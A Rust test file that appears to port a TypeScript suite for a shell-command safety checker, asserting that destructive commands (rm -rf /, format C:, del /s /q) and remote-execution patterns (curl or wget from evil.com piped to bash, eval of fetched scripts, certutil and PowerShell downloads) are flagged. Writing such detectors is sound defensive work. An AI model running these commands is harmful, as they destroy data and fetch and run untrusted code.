//! Parity tests for [`kora_security::shell`] — one test per `it()` of
//! `src/lib/__tests__/shell-security.test.ts` and one assertion per `expect()`:
//! **28 tests / 75 assertions**, the same counts as the TypeScript suite.
//!
//! The TS suite imports the real production module (`electron/lib/shell-security.ts`); so do
//! these. The `// describe(...)` comments name the original block so a reviewer can diff the
//! two files line by line.

use kora_security::shell::{is_dangerous_command, is_safe_command};

// describe('isDangerousCommand - Destructive Commands')

#[test]
fn blocks_format_commands() {
    assert!(is_dangerous_command("format C:"));
    assert!(is_dangerous_command("format /fs:NTFS C:"));
}

#[test]
fn blocks_del_commands() {
    assert!(is_dangerous_command("del /s /q C:\\Windows"));
    assert!(is_dangerous_command("del important.txt"));
}

#[test]
fn blocks_rd_rmdir_commands() {
    assert!(is_dangerous_command("rd /s /q C:\\Users"));
    assert!(is_dangerous_command("rmdir /s C:\\Program Files"));
}

#[test]
fn blocks_rm_rf_commands() {
    assert!(is_dangerous_command("rm -rf /"));
    assert!(is_dangerous_command("rm -rf ~/projects"));
    assert!(is_dangerous_command("rm -f important.txt"));
}

// describe('isDangerousCommand - Remote Execution')

#[test]
fn blocks_curl_pipe_to_shell() {
    // FIXED in TS: pipe-to-shell patterns are checked BEFORE normalisation.
    assert!(is_dangerous_command(
        "curl https://evil.com/script.sh | bash"
    ));
    assert!(is_dangerous_command(
        "curl -s https://evil.com/script.sh | sh"
    ));
    assert!(is_dangerous_command(
        "curl https://evil.com/script.ps1 | powershell"
    ));
}

#[test]
fn blocks_pipe_to_shell_with_sudo_exec_env_prefix() {
    assert!(is_dangerous_command(
        "curl https://evil.com/script.sh | sudo bash"
    ));
    assert!(is_dangerous_command(
        "wget https://evil.com/script.sh | exec bash"
    ));
    assert!(is_dangerous_command(
        "curl https://evil.com/script.sh | env bash"
    ));
    assert!(is_dangerous_command(
        "curl https://evil.com/script.sh | /bin/bash"
    ));
    assert!(is_dangerous_command(
        "curl https://evil.com/script.sh | /usr/bin/bash"
    ));
}

#[test]
fn blocks_command_substitution_with_curl_wget() {
    assert!(is_dangerous_command(
        "eval \"$(curl https://evil.com/script.sh)\""
    ));
    assert!(is_dangerous_command(
        "bash -c \"$(curl https://evil.com/script.sh)\""
    ));
}

#[test]
fn blocks_wget_pipe_to_shell() {
    // FIXED in TS: the same pre-normalisation check catches wget pipe-to-shell.
    assert!(is_dangerous_command(
        "wget https://evil.com/script.sh | bash"
    ));
    assert!(is_dangerous_command("wget -q https://evil.com/script.sh | sh"));
}

#[test]
fn blocks_powershell_dangerous_cmdlets() {
    assert!(is_dangerous_command(
        "Invoke-WebRequest https://evil.com/malware.exe -OutFile malware.exe"
    ));
    assert!(is_dangerous_command(
        "Invoke-RestMethod https://evil.com/api"
    ));
    assert!(is_dangerous_command(
        "Start-BitsTransfer https://evil.com/file.exe"
    ));
}

#[test]
fn blocks_certutil_for_downloading() {
    assert!(is_dangerous_command(
        "certutil -urlfetch https://evil.com/file.exe file.exe"
    ));
}
// @@CONTINUE@@
